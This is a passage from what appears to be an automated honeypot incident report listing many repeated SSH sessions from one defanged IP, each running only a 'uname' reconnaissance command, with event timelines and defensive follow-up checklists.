| `2026-03-16 05:00:08` | `cowrie.login.success` |
| `2026-03-16 05:00:09` | `cowrie.session.params` |
| `2026-03-16 05:00:09` | `cowrie.command.input` |
| `2026-03-16 05:00:09` | `cowrie.log.closed` |
| `2026-03-16 05:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6145cbb057cc

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:07` | `cowrie.session.connect` |
| `2026-03-16 05:00:07` | `cowrie.client.version` |
| `2026-03-16 05:00:07` | `cowrie.client.kex` |
| `2026-03-16 05:00:09` | `cowrie.login.success` |
| `2026-03-16 05:00:09` | `cowrie.session.params` |
| `2026-03-16 05:00:09` | `cowrie.command.input` |
| `2026-03-16 05:00:10` | `cowrie.log.closed` |
| `2026-03-16 05:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1edab07e7d

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:10` | `cowrie.session.connect` |
| `2026-03-16 05:00:10` | `cowrie.client.version` |
| `2026-03-16 05:00:11` | `cowrie.client.kex` |
| `2026-03-16 05:00:13` | `cowrie.login.success` |
| `2026-03-16 05:00:15` | `cowrie.session.params` |
| `2026-03-16 05:00:15` | `cowrie.command.input` |
| `2026-03-16 05:00:16` | `cowrie.log.closed` |
| `2026-03-16 05:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e7316133b8

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:11` | `cowrie.session.connect` |
| `2026-03-16 05:00:11` | `cowrie.client.version` |
| `2026-03-16 05:00:11` | `cowrie.client.kex` |
| `2026-03-16 05:00:13` | `cowrie.login.success` |
| `2026-03-16 05:00:14` | `cowrie.session.params` |
| `2026-03-16 05:00:14` | `cowrie.command.input` |
| `2026-03-16 05:00:15` | `cowrie.log.closed` |
| `2026-03-16 05:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69eb68256c9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:14` | `cowrie.session.connect` |
| `2026-03-16 05:00:14` | `cowrie.client.version` |
| `2026-03-16 05:00:14` | `cowrie.client.kex` |
| `2026-03-16 05:00:15` | `cowrie.login.success` |
| `2026-03-16 05:00:16` | `cowrie.session.params` |
| `2026-03-16 05:00:16` | `cowrie.command.input` |
| `2026-03-16 05:00:16` | `cowrie.log.closed` |
| `2026-03-16 05:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d08ac68d7f5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:18` | `cowrie.session.connect` |
| `2026-03-16 05:00:18` | `cowrie.client.version` |
| `2026-03-16 05:00:19` | `cowrie.client.kex` |
| `2026-03-16 05:00:20` | `cowrie.login.success` |
| `2026-03-16 05:00:22` | `cowrie.session.params` |
| `2026-03-16 05:00:22` | `cowrie.command.input` |
| `2026-03-16 05:00:23` | `cowrie.log.closed` |
| `2026-03-16 05:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941c18250236

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:23` | `cowrie.session.connect` |
| `2026-03-16 05:00:23` | `cowrie.client.version` |
| `2026-03-16 05:00:23` | `cowrie.client.kex` |
| `2026-03-16 05:00:25` | `cowrie.login.success` |
| `2026-03-16 05:00:26` | `cowrie.session.params` |
| `2026-03-16 05:00:26` | `cowrie.command.input` |
| `2026-03-16 05:00:34` | `cowrie.log.closed` |
| `2026-03-16 05:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f642000f72

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:31` | `cowrie.session.connect` |
| `2026-03-16 05:00:31` | `cowrie.client.version` |
| `2026-03-16 05:00:31` | `cowrie.client.kex` |
| `2026-03-16 05:00:32` | `cowrie.login.success` |
| `2026-03-16 05:00:33` | `cowrie.session.params` |
| `2026-03-16 05:00:33` | `cowrie.command.input` |
| `2026-03-16 05:00:33` | `cowrie.log.closed` |
| `2026-03-16 05:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c99a4f9a16

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:42` | `cowrie.session.connect` |
| `2026-03-16 05:00:42` | `cowrie.client.version` |
| `2026-03-16 05:00:43` | `cowrie.client.kex` |
| `2026-03-16 05:00:47` | `cowrie.login.success` |
| `2026-03-16 05:00:51` | `cowrie.session.params` |
| `2026-03-16 05:00:51` | `cowrie.command.input` |
| `2026-03-16 05:00:51` | `cowrie.log.closed` |
| `2026-03-16 05:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2205108ee353

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:47` | `cowrie.session.connect` |
| `2026-03-16 05:00:47` | `cowrie.client.version` |
| `2026-03-16 05:00:47` | `cowrie.client.kex` |
| `2026-03-16 05:00:48` | `cowrie.login.success` |
| `2026-03-16 05:00:49` | `cowrie.session.params` |
| `2026-03-16 05:00:49` | `cowrie.command.input` |
| `2026-03-16 05:00:49` | `cowrie.log.closed` |
| `2026-03-16 05:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09a249cbe18

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:50` | `cowrie.session.connect` |
| `2026-03-16 05:00:50` | `cowrie.client.version` |
| `2026-03-16 05:00:50` | `cowrie.client.kex` |
| `2026-03-16 05:00:52` | `cowrie.login.success` |
| `2026-03-16 05:00:53` | `cowrie.session.params` |
| `2026-03-16 05:00:53` | `cowrie.command.input` |
| `2026-03-16 05:00:53` | `cowrie.log.closed` |
| `2026-03-16 05:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e235a0fa77af

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:56` | `cowrie.session.connect` |
| `2026-03-16 05:00:56` | `cowrie.client.version` |
| `2026-03-16 05:00:57` | `cowrie.client.kex` |
| `2026-03-16 05:00:59` | `cowrie.login.success` |
| `2026-03-16 05:01:00` | `cowrie.session.params` |
| `2026-03-16 05:01:00` | `cowrie.command.input` |
| `2026-03-16 05:01:02` | `cowrie.log.closed` |
| `2026-03-16 05:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a7684790de

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:01 |
| **Last Seen** | 2026-03-16 05:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:01:03` | `cowrie.session.connect` |
| `2026-03-16 05:01:03` | `cowrie.client.version` |
| `2026-03-16 05:01:03` | `cowrie.client.kex` |
| `2026-03-16 05:01:05` | `cowrie.login.success` |
| `2026-03-16 05:01:09` | `cowrie.session.params` |
| `2026-03-16 05:01:09` | `cowrie.command.input` |
| `2026-03-16 05:01:10` | `cowrie.log.closed` |
| `2026-03-16 05:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec9217d7c97

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:01 |
| **Last Seen** | 2026-03-16 05:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:01:04` | `cowrie.session.connect` |
| `2026-03-16 05:01:04` | `cowrie.client.version` |
| `2026-03-16 05:01:04` | `cowrie.client.kex` |
| `2026-03-16 05:01:05` | `cowrie.login.success` |
| `2026-03-16 05:01:07` | `cowrie.session.params` |
| `2026-03-16 05:01:07` | `cowrie.command.input` |
| `2026-03-16 05:01:08` | `cowrie.log.closed` |
| `2026-03-16 05:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-984a07c7fa6a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:01 |
| **Last Seen** | 2026-03-16 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:01:17` | `cowrie.session.connect` |
| `2026-03-16 05:01:17` | `cowrie.client.version` |
| `2026-03-16 05:01:17` | `cowrie.client.kex` |
| `2026-03-16 05:01:18` | `cowrie.login.success` |
| `2026-03-16 05:01:19` | `cowrie.session.params` |
| `2026-03-16 05:01:19` | `cowrie.command.input` |
| `2026-03-16 05:01:20` | `cowrie.log.closed` |
| `2026-03-16 05:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c98f97bcd2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:01 |
| **Last Seen** | 2026-03-16 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:01:21` | `cowrie.session.connect` |
| `2026-03-16 05:01:21` | `cowrie.client.version` |
| `2026-03-16 05:01:21` | `cowrie.client.kex` |
| `2026-03-16 05:01:22` | `cowrie.login.success` |
| `2026-03-16 05:01:23` | `cowrie.session.params` |
| `2026-03-16 05:01:23` | `cowrie.command.input` |
| `2026-03-16 05:01:23` | `cowrie.log.closed` |
| `2026-03-16 05:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df0157cea4a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:01 |
| **Last Seen** | 2026-03-16 05:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:01:27` | `cowrie.session.connect` |
| `2026-03-16 05:01:27` | `cowrie.client.version` |
| `2026-03-16 05:01:28` | `cowrie.client.kex` |
| `2026-03-16 05:01:30` | `cowrie.login.success` |
| `2026-03-16 05:01:30` | `cowrie.session.params` |
| `2026-03-16 05:01:30` | `cowrie.command.input` |
| `2026-03-16 05:01:31` | `cowrie.log.closed` |
| `2026-03-16 05:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d3841e761f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:01 |
| **Last Seen** | 2026-03-16 05:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:01:59` | `cowrie.session.connect` |
| `2026-03-16 05:01:59` | `cowrie.client.version` |
| `2026-03-16 05:02:00` | `cowrie.client.kex` |
| `2026-03-16 05:02:01` | `cowrie.login.success` |
| `2026-03-16 05:02:02` | `cowrie.session.params` |
| `2026-03-16 05:02:02` | `cowrie.command.input` |
| `2026-03-16 05:02:02` | `cowrie.log.closed` |
| `2026-03-16 05:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-175ee73e519a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:02 |
| **Last Seen** | 2026-03-16 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:02:14` | `cowrie.session.connect` |
| `2026-03-16 05:02:14` | `cowrie.client.version` |
| `2026-03-16 05:02:14` | `cowrie.client.kex` |
| `2026-03-16 05:02:17` | `cowrie.login.success` |
| `2026-03-16 05:02:18` | `cowrie.session.params` |
| `2026-03-16 05:02:18` | `cowrie.command.input` |
| `2026-03-16 05:02:19` | `cowrie.log.closed` |
| `2026-03-16 05:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751c8db2dbdc

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:02 |
| **Last Seen** | 2026-03-16 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:02:22` | `cowrie.session.connect` |
| `2026-03-16 05:02:22` | `cowrie.client.version` |
| `2026-03-16 05:02:23` | `cowrie.client.kex` |
| `2026-03-16 05:02:25` | `cowrie.login.success` |
| `2026-03-16 05:02:26` | `cowrie.session.params` |
| `2026-03-16 05:02:26` | `cowrie.command.input` |
| `2026-03-16 05:02:27` | `cowrie.log.closed` |
| `2026-03-16 05:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c75ffa7da810

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:02 |
| **Last Seen** | 2026-03-16 05:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:02:33` | `cowrie.session.connect` |
| `2026-03-16 05:02:33` | `cowrie.client.version` |
| `2026-03-16 05:02:34` | `cowrie.client.kex` |
| `2026-03-16 05:02:40` | `cowrie.login.success` |
| `2026-03-16 05:02:40` | `cowrie.session.params` |
| `2026-03-16 05:02:40` | `cowrie.command.input` |
| `2026-03-16 05:02:41` | `cowrie.log.closed` |
| `2026-03-16 05:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da326f961d1a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:02 |
| **Last Seen** | 2026-03-16 05:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:02:41` | `cowrie.session.connect` |
| `2026-03-16 05:02:41` | `cowrie.client.version` |
| `2026-03-16 05:02:41` | `cowrie.client.kex` |
| `2026-03-16 05:02:43` | `cowrie.login.success` |
| `2026-03-16 05:02:44` | `cowrie.session.params` |
| `2026-03-16 05:02:44` | `cowrie.command.input` |
| `2026-03-16 05:02:45` | `cowrie.log.closed` |
| `2026-03-16 05:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dad6c1e6166

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:02 |
| **Last Seen** | 2026-03-16 05:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:02:42` | `cowrie.session.connect` |
| `2026-03-16 05:02:42` | `cowrie.client.version` |
| `2026-03-16 05:02:43` | `cowrie.client.kex` |
| `2026-03-16 05:02:51` | `cowrie.login.success` |
| `2026-03-16 05:02:52` | `cowrie.session.params` |
| `2026-03-16 05:02:52` | `cowrie.command.input` |
| `2026-03-16 05:02:52` | `cowrie.log.closed` |
| `2026-03-16 05:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f787dc56aac

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:00` | `cowrie.session.connect` |
| `2026-03-16 05:03:00` | `cowrie.client.version` |
| `2026-03-16 05:03:00` | `cowrie.client.kex` |
| `2026-03-16 05:03:00` | `cowrie.login.success` |
| `2026-03-16 05:03:02` | `cowrie.session.params` |
| `2026-03-16 05:03:02` | `cowrie.command.input` |
| `2026-03-16 05:03:03` | `cowrie.log.closed` |
| `2026-03-16 05:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158ffd08de6d

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:08` | `cowrie.session.connect` |
| `2026-03-16 05:03:08` | `cowrie.client.version` |
| `2026-03-16 05:03:09` | `cowrie.client.kex` |
| `2026-03-16 05:03:09` | `cowrie.login.success` |
| `2026-03-16 05:03:10` | `cowrie.session.params` |
| `2026-03-16 05:03:10` | `cowrie.command.input` |
| `2026-03-16 05:03:10` | `cowrie.log.closed` |
| `2026-03-16 05:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515539c405a9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:03:16` | `cowrie.session.connect` |
| `2026-03-16 05:03:16` | `cowrie.client.version` |
| `2026-03-16 05:03:17` | `cowrie.client.kex` |
| `2026-03-16 05:03:21` | `cowrie.login.success` |
| `2026-03-16 05:03:23` | `cowrie.session.params` |
| `2026-03-16 05:03:23` | `cowrie.command.input` |
| `2026-03-16 05:03:23` | `cowrie.log.closed` |
| `2026-03-16 05:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577879de1a2f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:03 |
| **Last Seen** | 2026-03-16 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
